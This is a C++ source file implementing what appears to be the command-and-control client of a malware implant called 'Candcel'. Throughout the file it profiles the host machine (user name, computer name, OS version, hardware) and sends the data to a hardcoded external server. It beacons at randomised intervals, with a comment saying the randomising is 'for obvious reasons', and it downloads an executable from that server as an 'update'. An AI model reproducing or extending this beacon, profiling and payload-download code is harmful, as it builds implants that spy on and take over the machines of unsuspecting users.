#include "stdafx.h"
#include "Log.h"
#include "Encrypt.h"
#include "Config.h"
#include "RestClient.h"
#include "TransferClient.h"
#include "Json.h"
#include "Candcel.h"

using namespace Amendux;

void Candcel::isAlive()
{
	Log::Instance()->write(L"Candcel", L"Check if server is alive");

	RestClient rc("0x17.nl", "avc_endpoint.php");

	rc.Call(RestClientCommand::CM_CLIENT_PING, new JSONValue);

	if (rc.getServerCode() != RestServerCommand::CM_SERVER_PONG) {
		Log::Instance()->write(L"Candcel", "Server did not respond");
	}
}


DWORD Candcel::CheckIn()
{
	if (!serverSolicitAck) {
		return 1;
	}

	while (true) {
		int nextInterval = (rand() % (10 + 1)) + 5;

		Log::Instance()->write(L"Candcel", L"Sending checkin request, interval " + std::to_wstring(nextInterval) + L" minutes");

		RestClient rc("0x17.nl", "avc_endpoint.php");

		JSONObject obj;
		obj[L"guid"] = new JSONValue(Config::Guid());

		rc.Call(RestClientCommand::CM_CLIENT_CHECKIN, new JSONValue(obj));

		if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
			Log::Instance()->write(L"Candcel", "Request failed");
		}

		/* Randomize the interval for obvious reasons */
		Sleep(nextInterval * 60 * 1000);
	}

	return 0;
}


void Candcel::Solicit()
{
	Log::Instance()->write(L"Candcel", L"Notify the server of this instance");

	RestClient rc("0x17.nl", "avc_endpoint.php");

	JSONObject obj;
	obj[L"guid"] = new JSONValue(Config::Guid());
	obj[L"cliver"] = new JSONValue(Config::getVersion());
	obj[L"winver"] = new JSONValue(Util::winver());
	obj[L"corenum"] = new JSONValue(std::to_wstring(Util::cpuCores()));
	obj[L"maxmem"] = new JSONValue(std::to_wstring(Util::maxmem()));
	obj[L"user"] = new JSONValue(Util::user());
	obj[L"computer"] = new JSONValue(Util::machine());

	rc.Call(RestClientCommand::CM_CLIENT_SOLICIT, new JSONValue(obj));

	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
		Log::Instance()->write(L"Candcel", "Request failed");
	}

	serverSolicitAck = true;
}


void Candcel::ApplyUpdate(unsigned int buildNumber, const std::wstring& wurl)
{
	Log::Instance()->write(L"Candcel", L"Sending update request");

	std::string url(wurl.begin(), wurl.end());

	TransferClient tc("http://0x17.nl/avctemp/bin/setup_105.exe");
	tc.Download();
}


void Candcel::CheckForUpdate()
{
	if (!serverSolicitAck) {
		return;
	}

	Log::Instance()->write(L"Candcel", L"Check for update");

	RestClient rc("0x17.nl", "avc_endpoint.php");

	JSONObject obj;
	obj[L"build"] = new JSONValue((double)clientVersion);

	JSONValue *returnObj = rc.Call(RestClientCommand::CM_CLIENT_UPDATE, new JSONValue(obj));

	if (rc.getServerCode() == RestServerCommand::CM_SERVER_UPDATE) {
		if (!returnObj->IsObject()) {
			Log::Instance()->error(L"Candcel", L"Server returned no object");
			return;
		}

		Log::Instance()->write(L"Candcel", L"Update available ");

		unsigned int build = static_cast<unsigned int>(returnObj->Child(L"build")->AsNumber());
		std::wstring url = returnObj->Child(L"url")->AsString();

		ApplyUpdate(build, url);
	} else if (rc.getServerCode() != RestServerCommand::CM_SERVER_IGNORE) {
		Log::Instance()->write(L"Candcel", "Request failed");
	}
}
